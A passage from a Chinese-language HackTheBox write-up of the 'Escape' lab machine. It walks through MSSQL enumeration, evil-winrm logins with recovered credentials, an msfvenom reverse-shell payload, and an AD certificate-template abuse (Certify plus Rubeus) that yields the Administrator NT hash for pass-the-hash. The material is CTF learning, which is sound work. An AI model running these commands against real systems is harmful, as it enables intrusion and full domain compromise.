sa                                                                                                                                 SQL_LOGIN                                                                                                                                                                                                                                                                                                                 NULL   2003-04-08 09:10:35   2022-11-18 13:43:07   b'Enabled' 
```

### 发现新凭据可以用msf扫描

之前说扫描失败，其实是自己配置错误。  
经过上一节的步骤了解了MSSQL的两种认证模式之后，知道自己用新的域凭据应该一定要设置 `USE_WINDOWS_AUTHENT  true`。但是之前又一直疑惑这个选项备注的“(requires DOMAIN option set)”的domain参数在哪，谷歌了下才知道msf模块里还有个 `advance` 命令，domain参数在这里面。  
于是配置：
```bash
msf6 > set

Global
======

  Name                 Value
  ----                 -----
  USE_WINDOWS_AUTHENT  true
  domain               sequel
  password             REGGIE1234ronnie
  rhosts               10.10.11.202
  username             sql_svc

msf6 auxiliary(admin/mssql/mssql_enum) > advanced 

Module advanced options (auxiliary/admin/mssql/mssql_enum):

   Name                     Current Setting                                          Required  Description
   ----                     ---------------                                          --------  -----------
……
   DOMAIN                   sequel                                                   yes       The domain to use for windows authentication
……
```

试了下可以成功扫描，于是又将之前用过的模块跑了一遍看看有无新信息。

#### 枚举的新信息

- xp_cmdshell is Not Enabled
- remote access is Enabled

其他模块得到的信息都差不多……


这条路大概也不行了，专注其他路线。


## Initial Access

### 记住：获得有效凭据就尝试横向移动

回顾了一下[APT靶机的过程](./HTB-APT.md#_3)，到底是怎么get shell的……

### evil-winrm使用域凭据get shell

真是对 `evil-winrm` 不熟悉，忘了可以试试这个啊……  
试了一下，顺利get shell：
```powershell
└─$ evil-winrm -i ${HTB_IP} -u sql_svc -p REGGIE1234ronnie                

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
sequel\sql_svc S-1-5-21-4078382237-1492182817-2568127209-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

看了眼flag应该不在这个用户，大概率在Ryan.Cooper里面。所以下一步尝试横向移动。
```
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc
```


## 域内探索&横向移动

很多命令执行不了有点难受，先传个Meterpreter：
```bash
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.xx.xx.xx LPORT=6666 -f exe -o s.exe


meterpreter > getsystem 
[-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
```

进行了漫长地搜索，毫无头绪。

高师傅指点说看看 `SQLServer\Logs`，里面有账号密码
```bash
……
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
……
```

凭据：Ryan.Cooper:NuclearMosquito3



## flag: user

```powershell
└─$ evil-winrm -i ${HTB_IP} -u Ryan.Cooper -p NuclearMosquito3

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper


*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> cat user.txt
de9e……cb29
```


## Privilege Escalation

### CA模板漏洞

看官方论坛提到 `Certify`，github搜到了[仓库](https://github.com/GhostPack/Certify)，但是说是二进制文件需要自己编译。  
然而我也第一次搞这个没有编译环境，尝试搜搜别人编译好的，于是在github发现[这个](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)。  
下载之后可直接上传。

```powershell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> upload Certify.exe
```

本来图方便直接用sql用户的Meterpreter上传执行来着，结果说没有发现。后来用这个用户就有漏洞了。
```powershell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> ./Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.4285047
```

跟着github文档的思路，我们可以发现：

- 对于UserAuthentication模板，“Domain Users”具有“Enrollment”的权限
- 通过 `net group "domain users" /domain` 我们也可以确认当前Ryan账户属于这个组

继续，依样画葫芦。对此模板申请一个新证书，指定“Administrator”作为Subject Alternative Name ([SAN](https://sccm.jp/2023/02/23/post-5106/), i.e. as a DA - 域管)：
```powershell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> ./Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 11

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwqm2BwPZUGjkPhNFxoBR142ZOb+7qKXir4J6wFJoyNJCtR0r……
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAAsoXe7Z249Q5gAAAAAACzANBgkqhkiG9w0BAQsF……
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:13.5175145
```

把“-----BEGIN RSA PRIVATE KEY-----”到“-----END CERTIFICATE-----”的部分存为 `cert.pem`，然后用 `openssl` 命令将其转为pfx文件（出现提示时，不要输入密码）。
```bash
└─$ ls
cert.pem

└─$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:

└─$ ls
cert.pem  cert.pfx
```

> [申请的证书可以与 `Rubeus` 一起使用来请求 TGT。](https://github.com/GhostPack/Certify#using-requested-certificates)

将cert.pfx和Rubeus.exe上传指靶机。

一开始跟着github的文档从头一直用“localadmin”，还以为只是个表示名。结果报错“KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN”，还奇怪来着。  
仔细看看原来AS-REQ里会请求“sequel.htb\localadmin”这个用户，那就不对了。

> [\*] Action: Ask TGT  
>  
> [\*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb  
> [\*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\localadmin'  
> [\*] Using domain controller: fe80::f9ed:2b4d:e647:50be%4:88  
>  
> [X] KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN

于是重新弄了一遍，将“localadmin” 替换为“Administrator”之后就成功了。

```powershell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> ./Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::f9ed:2b4d:e647:50be%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  6/4/2023 12:24:59 PM
  EndTime                  :  6/4/2023 10:24:59 PM
  RenewTill                :  6/11/2023 12:24:59 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  idLiswMt0Xl4p4McapF+7g==
  ASREP (key)              :  0604B6773800876A4D950F72524B5D15
```

但是光这样好像没用，或者说之后会很复杂？比如需要拿着ASREP去进行后续操作？以后有闲心可以尝试一下这种方式。

而这次，看看Rubeus的文档：

> [Requesting a ticket using a certificate and using `/getcredentials` to retrieve the NT hash](https://github.com/GhostPack/Rubeus#asktgt)

```powershell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> ./Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials

……

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F…………F4EE
```

获得Administrator的NTLMhash。  
另外，虽然和打靶没关系。注意到加密方式是rc4，在真实环境下用这么旧的方式会十分明显。


## flag: root

```powershell
└─$ evil-winrm -i ${HTB_IP} -u Administrator -H A52F…………F4EE

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/4/2023   4:49 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
9384……db0c
```

---

## 总结·后记

2023/06/04

挺有意思的，这次该好好总结一下了。Certify之后都是跟着github照葫芦画瓢，要好好琢磨一下各个地方的知识点。

首先是关于总体流程，RPC的优先度其实不该这么高。  
SMB → MSSQL，捕获NTLMv2，由于是msf模块所以不太清楚具体细节，不过看手动也有用`xp_dirtree`强制NTLM认证的样子。  
因为不熟悉MSSQL，进行了大量无意义的枚举。还总想着是否要登陆进去，结果登进去也没什么意义。早在hacktricks的最开头就写着关于获取Net-NTLM的信息了，不过因为想着不太可能破解NTLMv2所以就放置到最后才处理这步了。还是经验太少。

破解后获得域凭据 → 由于是域凭据所以尝试初始连接，根据以前APT的笔记，有很多工具，不过这次都是使用`Evil-WinRM`。

然后就是横向移动，感觉没什么技术含量，就略过吧。其实至今不明白为什么会想到组合err log里的两个username报错。是期待用户误操作将密码当用户名输入？

最后的提权算是我印象中域渗透的精华部分了。首先自己该有枚举什么信息的思路，当思路走到`Certify`时，将会发现CA模板漏洞，这个也是前阵子接触到的一个概念。将是我接下来需要好好琢磨的地方。  
特别是“Getting credentials using U2U”这里的U2U十分陌生。 